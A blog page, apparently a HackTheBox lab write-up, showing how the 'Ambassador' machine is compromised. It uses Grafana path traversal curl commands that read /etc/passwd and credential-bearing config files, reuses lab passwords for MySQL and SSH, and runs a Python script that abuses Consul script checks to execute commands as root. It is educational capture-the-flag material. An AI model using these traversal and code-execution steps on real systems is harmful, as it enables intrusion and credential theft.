@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="User Owning: After performing an Nmap scan, we find that there is SSH running on port 22, a static site running on port 80, a mysql server running on port 3306 (not locally), and a web app running on port 3000.
+The web-server running on port 80 displays a static site. Nothing interesting except this:
+Seems like we can login in SSH as developer with a password provided by the DevOps team." />
+<meta name="keywords" content=", hackthebox, linux, hacking" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://ryan-awad.github.io/htb-writeups/ambassador-writeup/" />
+
+
+    <title>
+        
+            Ambassador Writeup :: Ryan Awad&#39;s Blog  — Software Developer @ Trend Micro | Aspiring Security Researcher
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.0d7cbc4f65b5154195297bbc560fa1699e59bfd4eb02e40e213d975174a8eb16.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Ambassador Writeup">
+<meta itemprop="description" content="User Owning: After performing an Nmap scan, we find that there is SSH running on port 22, a static site running on port 80, a mysql server running on port 3306 (not locally), and a web app running on port 3000.
+The web-server running on port 80 displays a static site. Nothing interesting except this:
+Seems like we can login in SSH as developer with a password provided by the DevOps team.">
+<meta itemprop="datePublished" content="2022-12-28T13:16:47-05:00" />
+<meta itemprop="dateModified" content="2022-12-28T13:16:47-05:00" />
+<meta itemprop="wordCount" content="1816">
+<meta itemprop="image" content="https://ryan-awad.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="hackthebox,linux,hacking," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ryan-awad.github.io/"/>
+
+<meta name="twitter:title" content="Ambassador Writeup"/>
+<meta name="twitter:description" content="User Owning: After performing an Nmap scan, we find that there is SSH running on port 22, a static site running on port 80, a mysql server running on port 3306 (not locally), and a web app running on port 3000.
+The web-server running on port 80 displays a static site. Nothing interesting except this:
+Seems like we can login in SSH as developer with a password provided by the DevOps team."/>
+
+
+
+    <meta property="og:title" content="Ambassador Writeup" />
+<meta property="og:description" content="User Owning: After performing an Nmap scan, we find that there is SSH running on port 22, a static site running on port 80, a mysql server running on port 3306 (not locally), and a web app running on port 3000.
+The web-server running on port 80 displays a static site. Nothing interesting except this:
+Seems like we can login in SSH as developer with a password provided by the DevOps team." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ryan-awad.github.io/htb-writeups/ambassador-writeup/" />
+<meta property="og:image" content="https://ryan-awad.github.io/"/>
+<meta property="article:published_time" content="2022-12-28T13:16:47-05:00" />
+<meta property="article:modified_time" content="2022-12-28T13:16:47-05:00" /><meta property="og:site_name" content="Ryan Awad&#39;s Blog" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-12-28 13:16:47 -0500 EST" />
+
+
+
+
+
+
+
+
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-59CYRKS995', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tar -xf ~/ideas.tar.gz</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#b40aff;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/bug-bounties/">Bug Bounties</a></li><li><a href="/htb-writeups/">HTB Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://ryan-awad.github.io/htb-writeups/ambassador-writeup/">Ambassador Writeup</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><img src="../../img/Ambassador.png" alt="Untitled"></p>
+<h2 id="user-owning">User Owning:</h2>
+<p>After performing an Nmap scan, we find that there is SSH running on port 22, a static site running on port 80, a mysql server running on port 3306 (not locally), and a web app running on port 3000.</p>
+<p><img src="../../img/1.png" alt="Untitled"></p>
+<p>The web-server running on port 80 displays a static site. Nothing interesting except this:</p>
+<p><img src="../../img/2.png" alt="Untitled"></p>
+<p>Seems like we can login in SSH as <code>developer</code> with a password provided by the DevOps team. Neat! We move onto port 3000.</p>
+<p>The web app on port 3000 is <a href="https://github.com/grafana/grafana">Grafana</a>, which is some data-visualization software. We are greeted with a login page.</p>
+<p><img src="../../img/grafana.png" alt="Untitled"></p>
+<p>I decided to bruteforce web directories in Grafana using FFuF by running the following command:</p>
+<pre><code>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u &quot;http://10.10.11.183:3000/FUZZ&quot;
+</code></pre><p>After bruteforcing directories in Grafana, we find a <code>/metrics</code> page which contains Go metrics (info about how Grafana is running etc) since Grafana is partly written in Go. Skimming through the metrics, we can see an interesting endpoint: <code>public/plugins/:pluginId</code></p>
+<p>If we do some more research, we find a list of all plugin ids in Grafana such as: mysql, canvas, cloudwatch, etc…</p>
+<p>If we visit the endpoint <code>public/plugins/mysql/</code> , we get redirected to <code>/login</code> but if we visit <code>public/plugins/mysql/fubar</code>, we get the JSON response:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Plugin file not found&#34;</span>}
+</code></pre></div><p>This probably means that it looked for a file named <code>fubar</code> which did not exist. Let&rsquo;s try performing a directory traversal attack by visiting <code>public/plugins/mysql/../../../../../../../../../../../../../etc/passwd</code>. After trying this, it appears that the browser removes <code>../</code> sequences from the path, thus reducing the path to <code>/etc/passwd</code>.</p>
+<p><strong>To stop this from happening, we can send the GET request using cURL with the <code>--path-as-is</code> argument. This argument ensures that the <code>../</code> sequences will be KEPT in the path:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --path-as-is -X GET http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../../../../../etc/passwd
+</code></pre></div><p>After sending the request, SUCCESS! It returned the <code>/etc/passwd</code> file! We successfully exploited a path traversal vulnerability in Grafana.</p>
+<p><img src="../../img/3.png" alt="Untitled"></p>
+<p>Funnily enough, after finding this vulnerability, I found out that this path traversal vulnerability was previously reported (CVE-2021-43798) and apparently was a big deal: <a href="https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p">https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p</a></p>
+<p>More info: <a href="https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/">https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/</a></p>
+<p>Since we now have the ability to read files on the server (as the <code>grafana</code> user since you can see a <code>grafana</code> user existing in the <code>/etc/passwd</code> file and it&rsquo;s safe to assume that Grafana is being ran by the <code>grafana</code> user), we want to get credentials that will allow us to login to Grafana. After doing some research, we find that the admin password is stored in <code>/etc/grafana/grafana.ini</code>. So we use the path traversal vulnerability to get the contents of that file:</p>
+<pre><code>curl --path-as-is -X GET http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../../../../../etc/grafana/grafana.ini
+</code></pre><p>We then get a response with the contents of the <code>/etc/grafana/grafana.ini</code> file. After skimming through it, we find the field <code>admin_password=messageInABottle685427</code>. Boom!</p>
+<p>We proceed to login with the username “admin” and the password &ldquo;messageInABottle685427”.</p>
+<p>After logging in and looking around, there really isn’t anything interesting that we can do in Grafana. Using the same path traversal vulnerability we previously found, we try to find the password to the MySQL server running on port 3306 (recall back to the Nmap scan).</p>
+<p>After doing some research, we find that the MySQL credentials in Grafana are stored at <code>/etc/grafana/provisioning/datasources/mysql.yaml</code>. So using the path traversal vulnerability, we get the contents of this file:</p>
+<pre><code>curl --path-as-is -X GET \
+	http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
+</code></pre><p>The request returns the following:</p>
+<p><img src="../../img/4.png" alt="Untitled"></p>
+<p>Boom! The username is <code>grafana</code> and the password is <code>dontStandSoCloseToMe63221!</code>.</p>
+<p>We then log into the MySQL server using:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql --user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;grafana&#34;</span> --password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dontStandSoCloseToMe63221!&#34;</span> --host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.11.183&#34;</span>
+</code></pre></div><p>Boom! Successful login!</p>
+<p>We then enumerate all the databases using the <code>show databases;</code> command.</p>
+<p>We get the following:</p>
+<p><img src="../../img/5.png" alt="Untitled"></p>
+<p>After looking around in all the databases, what stands out is what’s in the <code>whackywidget</code> database. We select the <code>whackywidget</code> database by running the <code>\u whackywidget</code> command.</p>
+<p>We then enumerate all the tables within the database using the <code>show tables;</code> command. We get a single table <code>users</code>.</p>
+<p><img src="../../img/6.png" alt="Untitled"></p>
+<p>We get all rows within the <code>users</code> table by running the <code>SELECT * FROM users;</code> SQL query. We get the following:</p>
+<p><img src="../../img/7.png" alt="Untitled"></p>
+<p>It appears like the password is encoded in base64, which adds no extra level of security because an encoding is NOT the same as an encryption. This does not protect the password whatsoever as anyone can just decode a base64 string. We decode the base64 string:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34;</span> | base64 -d
+</code></pre></div><p>Which outputs:</p>
+<pre><code>anEnglishManInNewYork027468
+</code></pre><p>Therefore the password is <code>anEnglishManInNewYork027468</code>. But what is this password used for?</p>
+<p>If we recall what was on the static webpages on port 80, it said that to connect to this machine, you can login as <code>developer</code> with a password provided by the DevOps team. Let&rsquo;s try logging into SSH on this machine as <code>developer</code> and using the password we just found:</p>
+<pre><code>ssh developer@10.10.11.183
+developer@10.10.11.183's password: &lt;WE ENTER anEnglishManInNewYork027468&gt;
+</code></pre><p>And it works! We are now logged in as <code>developer</code>! You can find the <code>user.txt</code> file in the home directory. We print the contents of the <code>user.txt</code> file and boom! We user owned the box!</p>
+<p><img src="../../img/9.png" alt="Untitled"></p>
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+<p>Using <a href="https://github.com/DominicBreuker/pspy">pspy</a>, we can see that the root user (UID=0) is running <a href="https://www.consul.io/">Consul</a></p>
+<p><img src="../../img/10.png" alt="Untitled"></p>
+<p>Keeping this in mind, I keep looking around the machine. I explore the <code>/opt</code> directory and find a directory <code>my-app/</code>. Inside the <code>my-app/</code> directory, I find a <code>whackywidget/</code> directory. Upon exploring this directory, It appears to be a Python app. When inside the <code>/opt/my-app/whackywidget</code> directory, if we run <code>ls -a</code> to list all files including hidden files (dotfiles), we find a <code>.git/</code> directory. Using <a href="https://github.com/internetwache/GitTools">GitTools</a>, we are able to recover previous versions of the whackywidget app.</p>
+<p>In a previous version of the app, you can find the following in a <code>put-config-in-consul.sh</code> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># We use Consul for application config in production, this script will help set the correct values for the app</span>
+<span style="color:#75715e"># Export MYSQL_PASSWORD before running</span>
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</code></pre></div><p>The value for the argument <code>--token</code> seems interesting. Let&rsquo;s search what the <code>--token</code> argument means for the <code>consul</code> command-line tool.</p>
+<p>The value of the <code>--token</code> argument is apparently as &ldquo;Accessor ID&rdquo; for Consul which is used to authenticate requests to a local API running on machine for the Consul service.</p>
+<p>After doing some more digging, this API appears to be used to perform action in Consul over HTTP requests. This is interesting as we now have a way to authenticate your requests to this API, which will allow us to perform certain actions in Consul. But how could this help us in escalating our privilege?</p>
+<p>After doing some research on some potential vulnerabilities, I found the following:
+<a href="https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/">https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/</a></p>
+<p>It seems like it is possible to get Remote Code Execution in the Consul service as the user who is running Consul. Recall that in this machine, <code>root</code> is running Consul.</p>
+<p>The way this vulnerability works is that it takes advantage of the functionality of agents in Consul. Agents can be configured to repeatedly perform &ldquo;health checks&rdquo; in a specified interval of time to determine the health status of a target service. One of these supported health checks are called &ldquo;script checks&rdquo;. Script checks will execute any command or inline script by the Consul process at the configured interval. Checks can be registered via the Consul API. (<a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">Source</a>) In our case, all script checks will be executed as <code>root</code> since <code>root</code> is the user running the Consul service.</p>
+<p>Recall back to the Accessor ID that we found. This will allow us to authenticate our requests to the Consul API. Using this information, it&rsquo;s quite easy to craft a simple privilege escalation exploit. We simply need to use the Accessor ID to send a request to the Consul API to register a new agent with a script check which instructs the agent to execute any command line we desire (which will be executed as <code>root</code> as previously stated).</p>
+<p>More info: <a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations</a></p>
+<p>Important information that I also learnt during my research is that this vulnerability is only introduced if <code>enable_script_checks = true</code> in the <code>/etc/consul.d/consul.hcl</code> file.</p>
+<p>Checking the <code>/etc/consul.d/consul.hcl</code> shows that <code>enable_script_checks = true</code>. Therefore this vulnerability is possible to exploit.</p>
+<p>First things first, we need to find the port on which the Consul API is running. We can check all listening connection in the machine by running the command <code>netstat -nl</code>, which returns:</p>
+<pre><code>Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::3000                 :::*                    LISTEN     
+udp        0      0 127.0.0.1:8301          0.0.0.0:*                          
+udp        0      0 127.0.0.1:8302          0.0.0.0:*                          
+udp        0      0 127.0.0.1:8600          0.0.0.0:*                          
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:*                          
+
+</code></pre><p>Notice how the machine is listening <strong>locally</strong> on ports 8300, 8301, 8302, 8500, and 8600. I then tried sending a simple GET request to every port using cURL:</p>
+<pre><code>curl -X GET http://localhost:&lt;PORT NUM&gt;
+</code></pre><p>Port 8300 gave me the following error: <code>curl: (56) Recv failure: Connection reset by peer</code></p>
+<p>Port 8301, 8302, and 8600 responded with an empty response.</p>
+<p>Port 8500 responded with:</p>
+<pre><code>Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.
+</code></pre><p>Bingo! So the Consul API is running on port 8500.</p>
+<p>Using the accessor ID I previously found, I can send an HTTP request to the Consul API running locally on port 8500, and register a new agent with a script check. In the script check, I will instruct the agent to run a malicious bash script that I created named <code>PWN.sh</code> containing the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /root/root.txt &gt; /tmp/.css/root.txt
+<span style="color:#75715e"># simply prints the contents of root.txt into another file named root.txt in /tmp/.css</span>
+</code></pre></div><p>This malicious bash script will be stored in the <code>/tmp/.css</code> directory. I created the <code>/tmp/.css</code> directory to have a place to work and to avoid having all my files laying around the machine.</p>
+<p>I then read the Consul documentation to learn how to <a href="https://developer.hashicorp.com/consul/api-docs/agent/check">register a new agent with a script check</a> via the Consul API.</p>
+<p>With this information, I registered a new agent with a malicious script check using the following simple python script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> get, put
+<span style="color:#f92672">import</span> json
+
+NEW_CHECK <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({
+	<span style="color:#e6db74">&#39;Name&#39;</span>: <span style="color:#e6db74">&#39;pwn&#39;</span>,
+	<span style="color:#e6db74">&#39;Args&#39;</span>: [<span style="color:#e6db74">&#39;sh&#39;</span>, <span style="color:#e6db74">&#39;/tmp/.css/PWN.sh&#39;</span>], <span style="color:#75715e"># the malicious script was created at /tmp/.css/PWN.sh</span>
+	<span style="color:#e6db74">&#39;Interval&#39;</span>: <span style="color:#e6db74">&#39;5s&#39;</span>, <span style="color:#75715e"># check is ran every 5 seconds</span>
+})
+
+HEADERS <span style="color:#f92672">=</span> {
+	<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+	<span style="color:#e6db74">&#39;X-Consul-Token&#39;</span>: <span style="color:#e6db74">&#39;bb03b43b-1d81-d62b-24b5-39540ee469b5&#39;</span> <span style="color:#75715e"># The Accessor ID we previously found, to authenticate this request</span>
+}
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] Creating malicious agent...&#39;</span>)
+res <span style="color:#f92672">=</span> put(<span style="color:#e6db74">&#39;http://localhost:8500/v1/agent/check/register&#39;</span>, data<span style="color:#f92672">=</span>NEW_CHECK, headers<span style="color:#f92672">=</span>HEADERS) <span style="color:#75715e"># register the new malicious agent through the Consul API</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] DONE.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(res<span style="color:#f92672">.</span>status_code, res<span style="color:#f92672">.</span>reason, res<span style="color:#f92672">.</span>content)
+</code></pre></div><p>For more info on this exploit:
+<a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations</a></p>
+<p>For more info on agent checks in Consul: <a href="https://developer.hashicorp.com/consul/api-docs/agent/check">https://developer.hashicorp.com/consul/api-docs/agent/check</a></p>
+<p>Once the agent is created, after 5 seconds, the script check should be ran and there will be a file <code>/tmp/.css/root.txt</code> created which will contain the root flag. Boom, system owned!</p>
+<p><img src="../../img/11.png" alt="Untitled"></p>
+<h1 id="ambassador-has-been-pwned">Ambassador has been pwned!</h1>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://ryan-awad.github.io/tags/hackthebox/">hackthebox</a></span>
+        <span class="tag"><a href="https://ryan-awad.github.io/tags/linux/">linux</a></span>
+        <span class="tag"><a href="https://ryan-awad.github.io/tags/hacking/">hacking</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
